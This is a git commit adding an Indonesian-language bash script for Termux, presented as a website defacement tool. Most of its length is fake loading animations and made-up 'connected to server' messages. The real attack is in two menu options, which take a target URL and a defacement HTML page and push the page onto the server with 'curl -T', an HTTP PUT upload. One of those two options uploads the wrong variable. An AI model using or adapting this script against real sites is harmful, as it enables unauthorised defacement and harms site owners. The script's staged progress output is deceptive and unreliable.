f395ca1a9702c2e62a57d88a751ef692e9db0333
Laura-cyber23 <77380708+Laura-cyber23@users.noreply.github.com>
2021-01-17 15:47:22 +0700

    Add files via upload

---
+++ web.sh
@@ -0,0 +1,380 @@
+#!/bin/bash
+#coding_deface
+#RECODE TIDAK MEMBUAT ANDA PINTER?!!!
+green="\033[32;1m"
+yellow="\033[33;1m"
+indigo="\033[34;1m"
+red="\033[35;1m"
+purple="\033[37;1m"
+cyan="\033[36;1m"
+white="\033[39;1m"
+
+
+echo $cyan "Nama kakak?"
+read -p "nama-->" nama
+echo
+echo $red "Sedang di proses...."
+sleep 2
+clear
+
+
+echo $green "   < $nama  > "
+echo
+echo
+echo $red " laporkan jika ada bug!!"
+echo
+echo
+echo $red " Kernel Information:      Linux 3.18.91-2849239 armv6"
+echo
+sleep 3
+echo $red "Menghubungkan ke server....."
+sleep 7
+echo $red "Menunggu response server......"
+sleep 8
+echo $green "Berhasil!! Terhubung ke server!"
+sleep 3
+pkg install toilet -y
+echo
+echo  $green
+echo "Loading.............";
+sleep 0.1;
+clear
+echo  $green
+echo 'Harap Sabar.........................';
+sleep 0.1;
+clear
+echo  $green
+echo 'Loading.................';
+sleep 0.1;
+clear
+echo  $red
+echo 'Harap Sabar............................................';
+sleep 0.4;
+echo  $green
+echo "Loading..................................";
+sleep 0.1;
+clear
+echo  $green
+echo  'Harap Sabar...............';
+sleep 0.1;
+clear
+echo  $green
+echo 'Loading................................................';
+sleep 0.1;
+clear
+echo  $red
+echo 'Harap Sabar...........................';
+sleep 0.1;
+echo  $green
+echo "Loading.........................................";
+sleep 0.1;
+clear
+echo  $green
+echo 'Harap Sabar....................................................';
+sleep 0.1;
+clear
+echo  $green
+echo 'Loading................................';
+sleep 0.1;
+clear
+echo  $red
+echo 'Harap Sabar............................................';
+sleep 0.1;
+echo  $green
+echo "Loading.....................................";
+sleep 0.1;
+clear
+echo  $green
+echo 'Harap Sabar.............................';
+sleep 0.1;
+clear
+echo  $green
+echo 'Loading........................................................';
+sleep 0.1;
+clear
+echo  $red
+echo 'Harap Sabar........................';
+sleep 0.1;
+clear
+echo  $green
+echo "Loading.............................................";
+sleep 0.1;
+clear
+echo  $green
+echo 'Harap Sabar................';
+sleep 0.1;
+clear
+echo  $green
+echo 'Loading.................................';
+sleep 0.1;
+clear
+echo  $red
+echo 'Harap Sabar...................................................';
+sleep 0.4;
+echo  $green
+echo "Loading....................................";
+sleep 0.1;
+clear
+echo  $green
+echo "Loading.............................................";
+sleep 0.1;
+clear
+echo  $green
+echo 'Harap Sabar................';
+sleep 0.1;
+clear
+echo  $green
+echo 'Loading.................................';
+sleep 0.1;
+clear
+echo  $red
+echo 'Harap Sabar...................................................';
+sleep 0.4;
+echo  $green
+echo "Loading....................................";
+sleep 0.1;
+echo
+echo $green "nungguin yah?"
+sleep 5
+clear
+echo $green
+figlet "$nama"
+echo
+echo
+echo $green "Sabar uyy lagi reload :v"
+sleep 8
+clear
+echo
+echo
+echo
+echo
+echo
+echo
+echo
+toilet -f future "    Deface Web" | lolcat
+echo
+echo $red"##########################$green" HELLO "$red###########################"
+echo $yellow
+figlet -f future "Anonymous Error Sytem"
+echo
+echo $red"##########################$green" WELCOME "$red###########################"
+echo
+echo $indigo"   ~"$cyan"{"$white"A"$cyan"}"$green"."$yellow"Deface Web"$cyan
+echo $indigo"        ~"$cyan"{"$white"B"$cyan"}"$green"."$yellow"Periksa Web"$cyan
+echo $indigo"   ~"$cyan"{"$white"C"$cyan"}"$green"."$yellow"Tebas Index"$cyan
+echo
+echo $cyan"＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿"
+echo
+echo $indigo"  +"$cyan"{"$white"T"$cyan"}"$purple"."$green"Install bahan2 disini"$indigo"      +"$cyan"{"$white"I"$cyan"}"$green"Info"$indigo"      +"$cyan"{"$white"Q"$cyan"}"$green"Quit"$cyan
+echo $cyan"＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿"
+echo $indigo"=============================================================="
+echo
+echo $white "╭─"$yellow"Laura-cyber"$cyan" ~/Anonymous error"$white
+read -p " ╰─$ "  apaan
+echo
+if [ $apaan = "A" ] || [ $apaan = "a" ]
+then
+echo
+echo
+echo
+clear
+echo
+echo
+echo
+echo
+toilet -f future "Deface Web" | lolcat
+echo
+echo $red "Simpan Defacer Di Memory Internal Di Luar Folder "
+echo
+echo $yellow "Live Target"
+echo $white "maaf untuk sementara Live Target tidak bisa"
+figlet "Maaf"
+sleep 3
+echo $red "Web Target!!!"
+echo $green "╭─"$blue"Laura-cyber"$cyan" ~/Anonymous error"$white
+read -p " ╰─$ "  target
+echo
+echo $red "Masukan Defacer!!! "
+echo $green "╭─"$blue"Laura-cyber"$cyan" ~/Nama SC Harus(.html)"$white
+read -p " ╰─$ "  script
+curl -T /storage/emulated/0/$script $target
+echo $red "["$yellow"Link web deface"$red"]"$cyan"～～～＞" $target/$script
+echo
+echo $cyan"["$yellow"B"$cyan"]"$white"Ke menu "$cyan"["$yellow"Q"$cyan"]"$white"Keluar"
+read -p "[B/Q] : " back
+fi
+
+if [ $apaan = "B" ] || [ $apaan = "b" ]
+then
+echo
+echo
+echo
+clear
+echo
+echo
+echo
+echo $green "Sedang menyiapkan /"
+sleep 0.1
+echo $green "Sedang menyiapkan _"
+sleep 0.1
+echo $green "Sedang menyiapkan /"
+sleep 0.1
+echo $green "Sedang menyiapkan _"
+sleep 0.1
+echo $green "Sedang menyiapkan \"
+sleep 0.1
+echo $green "Sedang menyiapkan |"
+sleep 0.1
+echo $green "Sedang menyiapkan /"
+sleep 0.1
+echo $green "Sedang menyiapkan _"
+sleep 0.1
+echo $green "Sedang menyiapkan /"
+sleep 0.1
+echo $green "Sedang menyiapkan _"
+sleep 0.1
+echo $green "Sedang menyiapkan \"
+sleep 0.1
+echo $green "Sedang menyiapkan |"
+sleep 0.1
+echo $green "Sedang menyiapkan /"
+sleep 0.1
+echo $green "Sedang menyiapkan _"
+sleep 0.1
+echo $green "Sedang menyiapkan /"
+sleep 0.1
+echo $green "Sedang menyiapkan _"
+sleep 0.1
+echo $green "Sedang menyiapkan \"
+sleep 0.1
+echo $green "Sedang menyiapkan /"
+sleep 0.1
+echo $green "Sedang menyiapkan _"
+sleep 0.1
+echo $green "Sedang menyiapkan /"
+sleep 0.1
+echo $green "Sedang menyiapkan _"
+sleep 0.1
+echo $green "Sedang menyiapkan \"
+sleep 0.1
+echo $green "Sedang menyiapkan |"
+sleep 0.1
+echo $green "Sedang menyiapkan /"
+sleep 0.1
+echo $green "Sedang menyiapkan _"
+sleep 0.1
+echo $green "Sedang menyiapkan /"
+sleep 0.1
+
+echo $red "Gagal mengakses data/data/com.termux/files"
+figlet "Gagal"
+sleep 3
+echo
+echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
+read -p "[B/Q] : " back
+fi
+
+if [ $apaan = "C" ] || [ $apaan = "c" ]
+then
+echo
+echo
+echo
+clear
+echo
+echo
+echo
+echo $red
+toilet -f future "Tebas Index" | lolcat
+echo $cyan "Mengubah index suatu web"
+echo
+echo $red"###"$blue" ctrl + c to quit"$red" ###"
+echo
+echo
+echo
+echo "Masukan Script !!!!"
+echo $white "╭─"$green"Laura-cyber"$cyan" ~/Anonymous Error"$white
+read -p " ╰─$ " script1
+echo
+echo
+echo $white"Web Vuln tanpa lokalhost !!!!"
+echo $white "╭─"$green"Laura-cyber"$cyan" ~/proses 1 menit"$white
+read -p " ╰─$ " target1
+curl -T /storage/emulated/0/$script $target1
+echo $cyan"["$green"link deface web+"$cyan"]"$red"==="$white"＞"$green"$target1/$script1"
+echo
+echo
+echo
+echo $cyan"["$yellow"B"$cyan"]"$white"Ke menu "$cyan"["$yellow"Q"$cyan"]"$white"Keluar"
+read -p "[B/Q] : " back
+fi
+
+if [ $apaan = "I" ] || [ $apaan = "i" ]
+then
+echo
+echo
+echo
+clear
+echo
+echo
+echo
+echo
+toilet -f future "   Informasi Tools" | lolcat
+echo $red"##########################$green" WELCOME "$red###########################"
+echo $green"Author  : Laura UwU                    "
+echo $purple"Gthub   : https://github.com/Laura-cyber"
+echo $white"Blog    : Belum punya          lagi di buat ^^"
+echo
+echo $yellow"                          THANKS TO :"
+echo
+echo $cyan"[+] Allah Swt. "
+echo $cyan"[+] MR.MhmmdRzky "
+echo $cyan"[+] Mr.Vatality "
+echo $cyan"[+] All Member [A.E.S] "
+echo $red"##########################$green" WELCOME "$red###########################"
+echo $indigo"＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿"
+echo
+echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
+read -p "[B/Q] " back
+fi
+
+if [ $apaan = "T" ] || [ $apaan = "t" ]
+then
+echo $cyan "Menginstall bahannya2"
+echo $green "MOHON TUNGGU"
+sleep 5
+pkg up -y && pkg upgrade && apt update && apt upgrade && pkg install curl && pkg install ruby
+echo
+echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
+read -p "[B/Q] " back
+fi
+
+if [ $apaan = "Q" ] || [ $apaan = "q" ]
+then
+echo " Terimakasih Sudah Menggunakan Tools Ini :) "
+exit
+clear
+fi
+
+
+if [ $back = "B" ] || [ $back = "b" ]
+then
+echo $green "Di konfirmasi, Kembali ke menu....."
+sleep 5
+clear
+sleep 7
+echo $cyan "Gagal kembali kemenu!"
+echo $cyan "Reason error connection time out!"
+echo $green "Ketik sh web.sh Untuk kembali ke script"
+echo $red "LAPORKAN KE AUTHOR JIKA ADA BUG MERESAHKAN"
+fi
+
+if [ $back = "Q" ] || [ $back = "q" ]
+then
+echo $green "Di konfirmasi,Keluar dari script....."
+sleep 5
+clear
+figlet "Thank"
+sleep 5
+clear
+cd $HOME
+fi
